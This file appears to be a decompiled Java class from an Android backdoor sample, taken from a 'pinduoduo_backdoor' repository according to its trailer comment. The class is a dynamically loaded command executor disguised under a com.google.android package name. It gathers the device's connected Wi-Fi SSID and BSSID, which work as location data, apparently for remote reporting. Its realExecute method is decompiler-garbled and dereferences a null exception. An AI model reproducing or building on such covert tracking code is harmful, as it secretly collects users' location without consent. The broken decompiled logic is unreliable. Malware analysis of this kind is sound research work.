package com.google.android.sd.biz_dynamic_dex.query_lbs_info;

import android.content.Context;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import com.google.android.sd.biz_dynamic_dex.base.DynamicCmdExecutor;
import com.google.android.sd.cmd.CmdData;
import com.google.android.sd.cmd.CmdHandler;
import com.google.android.sd.utils.Utils;
import org.json.JSONObject;

public class QueryLBSInfoExecutor extends DynamicCmdExecutor {
  private int CMD = 74;
  
  private JSONObject getLBSInfo(Context paramContext) throws Exception {
    WifiInfo wifiInfo = ((WifiManager)paramContext.getApplicationContext().getSystemService("wifi")).getConnectionInfo();
    JSONObject jSONObject = new JSONObject();
    jSONObject.put("bssid", wifiInfo.getBSSID());
    jSONObject.put("ssid", wifiInfo.getSSID().replace("\"", ""));
    return jSONObject;
  }
  
  protected void realExecute(Context paramContext, String paramString) throws Exception {
    JSONObject jSONObject = new JSONObject(paramString);
    try {
      return;
    } finally {
      Exception exception = null;
      CmdHandler.dispatch(paramContext, Utils.buildErrorRespData(new CmdData(this.CMD, jSONObject.optString("uuid"), "client"), exception.getMessage(), null));
    } 
  }
}


/* Location:              C:\Users\daimiaopeng\Downloads\pinduoduo_backdoor-main\pinduoduo_backdoor-main\dex\74168acd-14b4-4ff8-842e-f92b794d7abf-dex2jar.jar!\com\google\android\sd\biz_dynamic_dex\query_lbs_info\QueryLBSInfoExecutor.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */